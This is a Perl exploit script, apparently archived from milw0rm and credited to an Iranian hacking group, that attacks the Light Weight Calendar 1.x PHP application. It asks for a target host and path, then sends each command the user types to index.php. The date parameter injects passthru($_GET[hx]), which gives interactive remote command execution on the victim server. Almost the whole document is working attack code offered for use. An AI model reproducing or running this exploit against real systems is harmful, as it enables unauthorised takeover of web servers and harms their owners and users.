#!/usr/bin/perl
#
# Light Weight Calendar
# Exploit by Hessam-x (www.hessamx.net)
#
######################################################
#  ___ ___                __                         #
# /   |   \_____    ____ |  | __ ___________________ #
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   / #
#\    Y    // __ \\  \___|    <\  ___/|  | \//    /  #
# \___|_  /(____  /\___  >__|_ \\___  >__|  /_____ \ #
#       \/      \/     \/     \/    \/            \/ #
#             Iran Hackerz Security Team             #
#               WebSite: www.hackerz.ir              #
#                                                    #
######################################################
# Name    : Light Weight Calendar                    #
# version : 1.*                                      #
######################################################
use LWP::Simple;

print "-------------------------------------------\n";
print "=          Light Weight Calendar          =\n";
print "=       By Hessam-x  - www.hackerz.ir     =\n";
print "-------------------------------------------\n\n";

      print "Target(www.example.com)\> ";
      chomp($targ = <STDIN>);

      print "path: (/lwc/)\>";
      chomp($path=<STDIN>);

while()
{

     print "command:\>";
     chomp($comd=<STDIN>);
     $expl="index.php?hx=".$comd."&date=passthru%28%24_GET%5Bhx%5D%29";
     $page=get("http://".$targ.$path.$expl) || die "[-] Exploit failed ...\n";

}

# milw0rm.com [2006-03-09]